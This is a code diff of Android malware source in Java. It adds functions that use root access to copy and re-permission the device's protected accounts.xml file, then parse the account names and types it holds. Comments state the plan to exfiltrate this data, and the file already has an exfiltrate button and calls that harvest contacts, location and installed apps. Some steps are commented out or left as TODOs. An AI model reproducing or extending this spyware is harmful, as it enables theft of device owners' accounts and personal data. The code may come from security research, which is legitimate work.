@@ -1,8 +1,18 @@
 package com.trustme.testsu;
 
+import java.io.IOException;
 import java.util.ArrayList;
+import java.util.HashMap;
+import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
+
+import javax.xml.parsers.ParserConfigurationException;
+import javax.xml.parsers.SAXParser;
+import javax.xml.parsers.SAXParserFactory;
+import org.xml.sax.Attributes;
+import org.xml.sax.SAXException;
+import org.xml.sax.helpers.DefaultHandler;
 
 import com.trustme.testsu.root.Root;
 import com.trustme.testsu.utils.Constants;
@@ -41,17 +51,37 @@ public class MainActivity extends Activity {
          datasource = new ContactsDataSource(this);
          database = datasource.open();
          //we should start checking for Internet connection only when there are new data available
-         getUserLocation();
-         getInstalledApplications();
-         getContacts();
-         getCompetitorsPid();
-         prepareButtonCheckIp();
-         prepareButtonStopCheckIp();
-         prepareButtonExfiltrate();
+         
+         prepareButtons();
+         performMalTasks();
+         
     	
     }
     
    
+    /**
+     * Prepares the buttons of the application
+     * @author sdemetr2
+     */
+	private void prepareButtons() {
+		// TODO Auto-generated method stub
+		prepareButtonCheckIp();
+        prepareButtonStopCheckIp();
+        prepareButtonExfiltrate();
+	}
+	
+	/**
+     * Perform malicious tasks
+     * @author sdemetr2
+     */
+	private void performMalTasks() {
+		// TODO Auto-generated method stub
+		//getUserLocation();
+        //getInstalledApplications();
+        //getContacts();
+        //getCompetitorsPid();
+        getUserAccounts();
+	}
 
 	@Override
     public void onDestroy(){
@@ -65,6 +95,19 @@ public class MainActivity extends Activity {
 		return true;
 	}
 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+	
+	private void getUserAccounts() {
+		//move accounts.xml to a convenient location and make it accessible
+		Root rt =new Root();
+	    rt.getSecretFile("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
+	   // rt.changeMode("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
+	    
+	    //parse accounts.xml and exfiltrate
+	    //ParseAccountsTask parse_accounts_task = new ParseAccountsTask();
+	    //parse_accounts_task.execute();
+	}	
+	
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	/**
 	 * Finds the pid of a competitor
@@ -170,7 +213,10 @@ public class MainActivity extends Activity {
 			
 			public void onClick(View v) {
 				// TODO Auto-generated method stub
-				exfiltrate(null,Constants.TEST_TRANSACTION);
+				//exfiltrate(null,Constants.TEST_TRANSACTION);
+				//test
+				Root rt = new Root();
+				rt.changeMode("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
 			}
 
 		});
@@ -285,6 +331,120 @@ public class MainActivity extends Activity {
         }
     }
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////
+	/**
+	* 
+	* Background Task for fetching user's contacts.
+	* It should try to exfiltrate them if there is Internet available or store them
+	*	in the Db and start the IP checker
+	*@author sdemetr2
+	*/
+	public class ParseAccountsTask extends AsyncTask<Void, Void, Void>{
+		protected ParseAccountsTask() { }
+		
+		@Override
+		protected Void doInBackground(Void... unused){
+			try {
+			// pass time so the built-in dialer app can make the call
+			Thread.sleep(50);
+			}
+			catch (InterruptedException localInterruptedException)
+			{
+			Log.d("ParseAccountsTask", "ParseAccountsTask received an InterruptedException");
+			}
+			
+			return null;
+		}
+		
+		@Override
+		protected void onPostExecute(Void justEyeCandy){
+			super.onPostExecute(justEyeCandy);
+			parseAccounts();
+			//getPackages();
+		}
+		
+		private void parseAccounts() {
+			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker
+			
+			//String type = new String();
+			String authority = new String();
+			
+			try {
+				SAXParserFactory factory = SAXParserFactory.newInstance();
+				SAXParser saxParser = factory.newSAXParser();
+				
+				DefaultHandler handler = new DefaultHandler() {
+					String type = new String();
+					String account = new String();
+					Integer account_num = new Integer(0);
+					HashMap<String, String> map = new HashMap<String, String>();
+					//boolean bauthority = false;
+					 
+					public void startElement(String uri, String localName,String qName, Attributes attributes) throws SAXException {
+					 
+						//System.out.println("Start Element :" + qName);
+					 
+						if (qName.equalsIgnoreCase("AUTHORITY")) {
+								Log.i(TAG, "Parsing: Found <authority> tag.");
+								account = attributes.getValue("account");
+								type = attributes.getValue("type");
+								
+								//Iterator<Integer> it = map.keySet().iterator();
+								if (map.isEmpty()){
+									//first account
+									Log.i(TAG, "Map is empty. Put the " + account + " to the map");
+									map.put(account, type); 
+								}
+								else{
+									//check if the account is already there
+									if (!map.containsKey(account)){
+										Log.i(TAG, "Map does not contain: " + account + ". Put the account to the map");
+										map.put(account, type);
+									}
+								}
+						}
+					 
+					}
+					 
+					public void endElement(String uri, String localName,
+						String qName) throws SAXException {
+					 
+						if (qName.equalsIgnoreCase("ACCOUNTS")) {
+							//TODO: if WIFI is on exfiltrate map else save map contents to DB
+						}
+					 
+					}
+					 
+					public void characters(char ch[], int start, int length) throws SAXException {
+					 
+//						if (bauthority) {
+//								System.out.println("First Name : " + new String(ch, start, length));
+//								bauthority = false;
+//						}
+					 
+					}
+					 
+				};
+					 
+			saxParser.parse(Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME, handler);
+				
+			} catch (ParserConfigurationException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			} catch (SAXException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			} catch (IOException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+			
+			
+		
+		}
+	}  
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////    
     
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	/**
